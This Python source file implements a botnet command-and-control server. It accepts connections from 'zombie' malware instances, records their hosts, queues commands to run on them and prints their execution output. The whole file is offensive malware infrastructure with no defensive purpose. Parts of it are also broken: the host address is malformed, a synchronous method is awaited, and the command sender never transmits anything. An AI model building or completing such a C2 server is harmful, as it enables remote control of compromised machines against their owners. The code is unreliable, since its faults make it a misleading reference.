import asyncio
import json
import os
import socket
import struct
import time
import traceback
from typing import Dict, List, Callable, Optional

# --- C2 Configuration ---
C2_PORT = 4444
C2_HOST = "127.0.0"
ADMIN_IDS = [123456789, 987654321] # Replace with real Admin's IDs
ACTIVE_BOTS: Dict[str, Dict] = {}  # Stores connected malware instances {session_id: {ip, host, timestamp, last_active}}
COMMAND_QUEUE: Dict[str, List[str]] = {}  # Stores pending commands per session

# --- Core C2 Logic ---

class C2Server:
    def __init__(self):
        self.server_socket = None
        self.is_running = True
        
    async def start_listening(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((C2_HOST, C2_PORT))
        self.server_socket.listen(5)
        print(f"[C2] Server listening on {C2_HOST}:{C2_PORT}")
        
        while self.is_running:
            self.server_socket.setblocking(False)
            try:
                client_socket, addr = self.server_socket.accept()
                client_socket.setblocking(False)
                session_id = f"{addr[0]}_{addr[1]}"
                ACTIVE_BOTS[session_id] = {
                    'socket': client_socket,
                    'ip': addr[0],
                    'port': addr[1],
                    'host': socket.gethostbyaddr(addr[0])[0],
                    'timestamp': time.time()
                }
                COMMAND_QUEUE[session_id] = []
                print(f"[C2] New Zombie Connected: {session_id} ({addr[0]})")
                asyncio.create_task(self.handle_client(session_id, client_socket))
            except BlockingIOError:
                await asyncio.sleep(0.1)
            except Exception as e:
                if "Accept" in str(e):
                    await asyncio.sleep(0.1)
                else:
                    print(f"[C2] Error accepting: {e}")
                    
    async def handle_client(self, session_id: str, client_socket: socket.socket):
        try:
            while session_id in ACTIVE_BOTS:
                try:
                    client_socket.setblocking(False)
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    await self.process_incoming_data(session_id, data)
                except BlockingIOError:
                    await asyncio.sleep(0.05)
                    continue
        except Exception as e:
            print(f"[C2] Connection lost with {session_id}: {e}")
        finally:
            if session_id in ACTIVE_BOTS:
                del ACTIVE_BOTS[session_id]
            if session_id in COMMAND_QUEUE:
                del COMMAND_QUEUE[session_id]
            client_socket.close()
            print(f"[C2] Zombie Disconnected: {session_id}")
            
    def process_incoming_data(self, session_id: str, data: bytes):
        try:
            length = struct.unpack('I', data[:4])[0]
            payload = data[4:4+length].decode('utf-8')
            msg_type = payload[:10]
            content = payload[10:]
            
            if msg_type == "EXEC_OUT":
                # Simulating output from malware
                print(f"[{session_id}] OUTPUT: {content}")
            elif msg_type == "STATUS":
                # Update bot status
                ACTIVE_BOTS[session_id]['last_active'] = time.time()
                ACTIVE_BOTS[session_id]['status'] = content
        except Exception as e:
            print(f"[C2] Parse error for {session_id}: {e}")
            
    async def send_command(self, session_id: str, cmd: str):
        if session_id not in ACTIVE_BOTS:
            return False
        try:
            client_socket = ACTIVE_BOTS[session_id]['socket']
            cmd_bytes = f"EXEC_CMD{cmd}".encode('utf-8')
            header = struct.pack('I', len(cmd_bytes))
            return True
        except Exception as e:
            print(f"[C2] Send error to {session_id}: {e}")
            return False
            
    def stop(self):
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()